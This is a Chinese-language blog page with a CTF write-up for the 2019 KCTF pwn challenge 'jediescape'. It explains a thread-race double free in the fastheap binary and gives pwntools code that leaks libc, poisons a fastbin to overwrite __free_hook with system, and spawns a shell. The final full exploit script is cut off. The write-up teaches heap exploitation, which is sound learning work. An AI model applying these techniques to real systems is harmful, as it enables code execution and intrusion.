@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn UAF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这是一道多线程pwn，昨天终于把ctf-wiki上堆的部分看完了，上面的题基本也都调了一遍，现在想多调几道题巩固一下，顺便看看自己学的怎么样了。 程序基本信息12345678910_  jediescape file fastheapfastheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linke">
+<meta name="keywords" content="pwn UAF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019 KCTF 绝地逃生 writeup">
+<meta property="og:url" content="https://v1ckydxp.github.io/archives/2019/07/09/2019_KCTF_绝地逃生_writeup/index.html">
+<meta property="og:site_name" content="v1cky&#39;blog">
+<meta property="og:description" content="这是一道多线程pwn，昨天终于把ctf-wiki上堆的部分看完了，上面的题基本也都调了一遍，现在想多调几道题巩固一下，顺便看看自己学的怎么样了。 程序基本信息12345678910_  jediescape file fastheapfastheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linke">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-07-11T00:57:56.535Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019 KCTF 绝地逃生 writeup">
+<meta name="twitter:description" content="这是一道多线程pwn，昨天终于把ctf-wiki上堆的部分看完了，上面的题基本也都调了一遍，现在想多调几道题巩固一下，顺便看看自己学的怎么样了。 程序基本信息12345678910_  jediescape file fastheapfastheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linke">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://v1ckydxp.github.io/archives/2019/07/09/2019_KCTF_绝地逃生_writeup/">
+
+
+
+
+
+  <title>2019 KCTF 绝地逃生 writeup | v1cky'blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">v1cky'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">few words,many deeds!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://v1ckydxp.github.io/archives/2019/07/09/2019_KCTF_绝地逃生_writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="v1cky01dxp">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v1cky'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019 KCTF 绝地逃生 writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-09T00:00:00+08:00">
+                2019-07-09
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-07-11T08:57:56+08:00">
+                2019-07-11
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这是一道多线程pwn，昨天终于把ctf-wiki上堆的部分看完了，上面的题基本也都调了一遍，现在想多调几道题巩固一下，顺便看看自己学的怎么样了。</p>
+<h3 id="程序基本信息"><a href="#程序基本信息" class="headerlink" title="程序基本信息"></a>程序基本信息</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_  jediescape file fastheap</span><br><span class="line">fastheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=a8b29ae580133e68ac546242be2d3d790217c472, stripped</span><br><span class="line">_  jediescape checksec fastheap</span><br><span class="line">[*] <span class="string">'/home/docker/pwnable/KCTF2019/jediescape/fastheap'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+<p>这是一个64位可执行程序，基本开启了所有的安全保护机制。</p>
+<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_  jediescape ./fastheap</span><br><span class="line"><span class="number">1.</span> <span class="built_in">malloc</span></span><br><span class="line"><span class="number">2.</span> fast <span class="built_in">free</span></span><br><span class="line"><span class="number">3.</span> <span class="built_in">puts</span></span><br><span class="line"><span class="number">4.</span> <span class="built_in">exit</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+<p>程序有三个常规的功能，分配、释放、输出。具体逻辑拖进ida查看。</p>
+<h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 index; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rt1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"Index: "</span>);</span><br><span class="line">  index = (<span class="keyword">unsigned</span> __int8)getnumber();         <span class="comment">// index是无符号整数，范围为0-255</span></span><br><span class="line">  <span class="keyword">if</span> ( heap_ptr[index] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"Size: "</span>);</span><br><span class="line">  size = (<span class="keyword">unsigned</span> __int8)getnumber();          <span class="comment">// size也是无符号整数，范围为0-255</span></span><br><span class="line">  heap_ptr[index] = alloc(size);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"Contents: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = v3 ^ v4;</span><br><span class="line">  <span class="keyword">if</span> ( v3 == v4 )</span><br><span class="line">    result = getline(heap_ptr[index], size);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有一个存储在bss段的指针数组heap_ptr，用于保存堆指针，上面可以看到index是<code>unsigned __int8</code> 类型，所以index的范围在0-255之间，同理size，所以每个堆块的大小最大为0xff。这里的getline函数没有off-byte-overflow漏洞。</p>
+<h4 id="fast-free"><a href="#fast-free" class="headerlink" title="fast free"></a>fast free</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"Index range: "</span>);</span><br><span class="line">  getline((__int64)&amp;nptr, <span class="number">9L</span>L);</span><br><span class="line">  start = strtol(&amp;nptr, &amp;endptr, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *endptr != <span class="string">'-'</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  start_index = start;</span><br><span class="line">  end_index = strtoul(endptr + <span class="number">1</span>, &amp;endptr, <span class="number">10</span>);</span><br><span class="line">  v10 = end_index;</span><br><span class="line">  <span class="keyword">if</span> ( *endptr )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( end_index &gt; <span class="number">0xFF</span> || start_index &gt;= end_index )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( start_index &gt; <span class="number">0xFF</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"Number of workers: "</span>);</span><br><span class="line">  threads_num = getnumber();</span><br><span class="line">  v4 = threads_num;</span><br><span class="line">  <span class="keyword">if</span> ( threads_num &gt; <span class="number">8u</span>LL )                     <span class="comment">// 线程数不能超过8个</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  endIndex = end_index;</span><br><span class="line">  v13 = start_index;</span><br><span class="line">  <span class="keyword">if</span> ( threads_num )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = &amp;newthread[threads_num];</span><br><span class="line">    ntid = newthread;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( pthread_create((<span class="keyword">pthread_t</span> *)ntid, <span class="number">0L</span>L, (<span class="keyword">void</span> *(*)(<span class="keyword">void</span> *))start_routine, &amp;endIndex) )<span class="comment">// 这里最多可以有8个线程来进行free，线程处理函数是start_routine,该函数在进行free之后没有将指针置为null,存在UAF</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      ++ntid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 != ntid );</span><br><span class="line">    v7 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">while</span> ( !pthread_join(newthread[v7], <span class="number">0L</span>L) ) <span class="comment">// 以阻塞的方式使线程结束</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == ++v7 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = v9 ^ v16;</span><br><span class="line">  <span class="keyword">if</span> ( v9 == v16 )</span><br><span class="line">    result = (__int64)<span class="built_in">memset</span>(&amp;heap_ptr[start_index], <span class="number">0</span>, <span class="number">8</span> * (v10 - start_index));<span class="comment">// 将free之后的heap_ptr堆指针置为0</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里采用的用线程来free堆块，没有线程的处理函数是<code>start_routine</code>，在线程结束之后，会将bss段中heap_ptr数组的堆指针清空。</p>
+<h4 id="start-routine"><a href="#start-routine" class="headerlink" title="start_routine"></a>start_routine</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">fastcall <span class="title">start_routine</span><span class="params">(<span class="keyword">void</span> *end_index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 start_index; <span class="comment">// [rsp+0h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    start_index = (<span class="keyword">unsigned</span> __int8)_InterlockedExchangeAdd8((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int8 *)end_index + <span class="number">8</span>, <span class="number">1u</span>);<span class="comment">// _InterlockedExchangeAdd8（）函数的作用是将第一个参数指向的值加上第二个参数，返回第一个参数的原始值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)end_index &lt;= start_index )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !heap_ptr[start_index] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)heap_ptr[start_index]);        <span class="comment">// 释放之后没有将指针置为空</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>end_index+8实际指的是start_index的位置，也就是会说_InterlockedExchangeAdd8()函数没有会将start_index的值加1，返回加1之前的值。而end_index是一直不变。比如现在有两个线程来同时释放，end_inex为255,在当前线程中start_index的值为254，在第一次循环的时候，start_index+1为255。但是if比较的还是原来的值254，所以第一次不会break，会进行free(heap_ptr[254])操作。这时候还是停在当前线程中，进入下一次循环，而这时，start_index+1之后为0，比较的时候start_index为255，满足break条件，退出当前线程。<br>进入第二个线程时start_index为0，end_index为255。就会导致0-254之间的堆块都会被释放一遍。导致double free。</p>
+<p>puts就是输出对应索引的堆块内容。但是会判断指针是否为空，为空就会直接退出。</p>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>这道题提供了libc2.27，要考虑tcache的作用。</p>
+<p>在线程中free chunk时会加到那个线程自己的tcache，然后线程退出时这些chunks会被放回fastbin或者unsortedbin而不是主线程的tcache。所以把index 0设置为unsortedbin大小可以直接leak libc的地址。详细可以下面的参考博客。</p>
+<h4 id="1-泄漏libc地址"><a href="#1-泄漏libc地址" class="headerlink" title="1. 泄漏libc地址"></a>1. 泄漏libc地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#step 1 : leak libc addr</span></span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'0'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)<span class="comment">#index 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">        malloc(i,<span class="number">0x60</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#end_index = 255,start_index = 250</span></span><br><span class="line">    <span class="comment">#two threads used to free</span></span><br><span class="line">    <span class="comment">#this will cause index of 0-254 will free again after free 250-254.</span></span><br><span class="line">    free(<span class="string">'250-255'</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#now index0 put into unsorted bin</span></span><br><span class="line">    <span class="comment">#index0'fd and bk point to main_arena_88,</span></span><br><span class="line">    <span class="comment">#free only clear heap_ptr[250-255]</span></span><br><span class="line">    <span class="comment">#so heap_ptr[0] is not null ,show(0)can leak libc addr</span></span><br><span class="line">    main_arena_offset = <span class="number">0x3ebca0</span></span><br><span class="line">    log.info(<span class="string">'main_arena_offset : '</span>+hex(main_arena_offset))</span><br><span class="line">    libc = u64(show(<span class="number">0</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - main_arena_offset</span><br><span class="line">    log.info(<span class="string">'libc base addr : '</span> + hex(libc) )</span><br></pre></td></tr></table></figure>
+<p>首先分配一个大小不属于fastbin中的堆块，用于之后free放入unsortedbin泄漏libc。由于在free的时候检测到指针为null就会退出，所以先要把0-254之前的heap_ptr填满。之后free(250-255)，在将250-254之间的堆块释放之后会将0-254之间的堆块都释放一遍。在线程退出后，index 0会被放入unsortedbin中，index0的指针没有被清空，所以show(0)就会输出unsorted bin的地址即main_arena_88的位置。线程tcache bin[0x70]中的堆块在退出时都会被放入到fastbin[0x70]中。</p>
+<p><strong>线程1</strong></p>
+<p>线程1没有退出之前，释放的堆块会被放入tcache bin [0x70]。</p>
+<p><code>tcache bin[0x70]:254-&gt;253-&gt;...-&gt;250</code></p>
+<p>当start_index为0时会退出线程1，tcache 中的堆块大小属于fastbin ，会被放入fastbin中。<br><code>fastbin[0x70]:250-&gt;251-&gt;....-&gt;254</code></p>
+<p><strong>线程2</strong></p>
+<p>同理，处理过程和线程1一样，线程2进入时start_index为0，end_index为255，所以会将0-254的堆块都释放。<br>index 0 的大小属于unsorted bin，线程退出之前在tcache bin[0x90]中，退出之后会被放入unsorted bin。<br>index 1-7,会先将tcache bin[0x70]填满，剩下的会依次放入fastbin[0x70]中，线程退出后，tcache bin[0x70]中的1-7会被放入fastbin[0x70]中。</p>
+<p>最终fastbin[0x70]</p>
+<p><code>fastbin[0x70]:1-&gt;2-&gt;3....-&gt;7-&gt;254-&gt;253-&gt;252-&gt;251-&gt;250......-&gt;8-&gt;250-&gt;251...-&gt;254</code></p>
+<h4 id="2-UAF，覆盖free-hook的地址为system-addr"><a href="#2-UAF，覆盖free-hook的地址为system-addr" class="headerlink" title="2. UAF，覆盖free_hook的地址为system_addr"></a>2. UAF，覆盖free_hook的地址为system_addr</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#free(250-255)，只是将heap_ptr[250]~heap_ptr[254]中的指针清空了，但是0～249的指针没有被清空</span></span><br><span class="line">    free(<span class="string">'2-3'</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#fastbin[0x70]:2-&gt;1-&gt;2-&gt;3....-&gt;7-&gt;254-&gt;253-&gt;252-&gt;251-&gt;250......-&gt;8-&gt;250-&gt;251...-&gt;254</span></span><br><span class="line">    free_hook = elf_libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    <span class="comment">#log.info('free_hook'+hex(elf_libc.symbols['__free_hook']))</span></span><br><span class="line"><span class="comment">#将heap_ptr[2]'fd指针改为free_hook指针。</span></span><br><span class="line"><span class="comment">#fastbin:1-&gt;2-&gt;free_hook</span></span><br><span class="line">    malloc(<span class="number">2</span>,<span class="number">0x60</span>,p64(libc+free_hook)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#fastbin:2-&gt;free_hook</span></span><br><span class="line">    malloc(<span class="number">250</span>,<span class="number">0x60</span>,<span class="string">'/bin/sh\n'</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#fastbin-&gt;free_hook</span></span><br><span class="line">    malloc(<span class="number">251</span>,<span class="number">0x60</span>,<span class="string">'/bin/sh\n'</span>)<span class="comment">#2</span></span><br><span class="line">    system_addr = elf_libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">    log.info(<span class="string">'system addr '</span>+ hex(system_addr))</span><br><span class="line"><span class="comment">#heap_ptr[252]将分配到free_hook地址</span></span><br><span class="line">    malloc(<span class="number">252</span>,<span class="number">0x60</span>,p64(libc+system_addr)+<span class="string">'\n'</span>)</span><br><span class="line">    free(<span class="string">"250-252"</span>,<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> 